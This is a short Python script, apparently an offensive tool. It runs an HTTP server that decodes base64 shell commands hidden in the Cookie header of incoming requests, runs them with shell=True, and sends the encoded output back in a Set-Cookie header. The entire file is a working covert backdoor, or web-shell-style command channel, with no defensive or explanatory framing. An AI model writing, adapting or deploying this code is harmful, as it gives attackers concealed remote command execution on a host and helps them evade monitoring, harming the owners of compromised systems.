from http.server import HTTPServer, BaseHTTPRequestHandler
import subprocess
from base64 import urlsafe_b64encode, urlsafe_b64decode
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--serverip', required=True, help = 'Enter your IP address')
parser.add_argument('-p', '--port', default=8000, type=int, help = 'Specify the port to serve on')
options = parser.parse_args()

host = options.serverip
port = options.port

class serve(BaseHTTPRequestHandler):
    
    def do_GET(self):          
        if self.path != '/favicon.ico':
            encoded_command = self.headers['Cookie'].split('Cookie')[1][1:]
            command = urlsafe_b64decode(encoded_command.encode()).decode()
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()[0]
            encoded_output = urlsafe_b64encode(bytes(output)).decode()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.send_header("Set-Cookie", encoded_output)
            self.end_headers()
        else:
            pass
        
httpd = HTTPServer((host, port), serve)
httpd.serve_forever()
